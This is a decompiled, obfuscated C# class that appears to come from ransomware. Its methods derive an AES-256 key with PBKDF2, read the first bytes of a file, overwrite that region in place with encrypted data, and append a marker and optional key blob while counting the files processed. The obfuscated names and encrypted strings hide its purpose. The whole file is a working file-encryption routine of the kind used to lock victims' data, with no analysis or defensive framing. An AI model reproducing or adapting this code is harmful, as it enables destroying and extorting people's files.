using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

public static class UMakmguwDziAz
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] YfzRuKIVSlIggFhc(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = ItZmyFUfqnPhlf(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes ItZmyFUfqnPhlf(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] DfejPHmIhOnY(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (hiKoLLubGHH.uneEoMuaKwN == getString_0(107397027))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (hiKoLLubGHH.WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(hiKoLLubGHH.YPtXSOBdFjEyjx, getString_0(107116901) + string_0 + getString_0(107196230) + ex.Message + getString_0(107396373));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void nkwBxgmWNRASp(string sNrLziMcVOrPcU, byte[] fWRwXzgCAjjaTG, byte[] afrhZVQdJhNaNnw = null)
	{
		try
		{
			byte[] array = null;
			if (hiKoLLubGHH.uneEoMuaKwN == getString_0(107397027))
			{
				array = (hiKoLLubGHH.kzxgomJEqSw ? Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172))) : Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(sNrLziMcVOrPcU, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(fWRwXzgCAjjaTG, 0, fWRwXzgCAjjaTG.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(sNrLziMcVOrPcU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hiKoLLubGHH.kzxgomJEqSw)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(afrhZVQdJhNaNnw, 0, afrhZVQdJhNaNnw.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (hiKoLLubGHH.kzxgomJEqSw ? Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172))) : Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213))));
				FileStream fileStream2 = new FileStream(sNrLziMcVOrPcU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(fWRwXzgCAjjaTG, 0, fWRwXzgCAjjaTG.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(sNrLziMcVOrPcU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hiKoLLubGHH.kzxgomJEqSw)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(afrhZVQdJhNaNnw, 0, afrhZVQdJhNaNnw.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			hiKoLLubGHH.jTlplcaVkMbxzj++;
		}
		catch (Exception ex)
		{
			if (hiKoLLubGHH.WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(hiKoLLubGHH.YPtXSOBdFjEyjx, getString_0(107116901) + sNrLziMcVOrPcU + getString_0(107196195) + ex.Message + getString_0(107396373));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (hiKoLLubGHH.kzxgomJEqSw ? Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196172))) : Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(hiKoLLubGHH.JsiIpuaiIxQx) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213)) + Convert.ToString(hiKoLLubGHH.lpATBSWKaW) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196213))));
			FileStream fileStream4 = new FileStream(sNrLziMcVOrPcU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(fWRwXzgCAjjaTG, 0, fWRwXzgCAjjaTG.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(sNrLziMcVOrPcU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!hiKoLLubGHH.kzxgomJEqSw)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(afrhZVQdJhNaNnw, 0, afrhZVQdJhNaNnw.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static UMakmguwDziAz()
	{
		Strings.CreateGetStringDelegate(typeof(UMakmguwDziAz));
	}
}
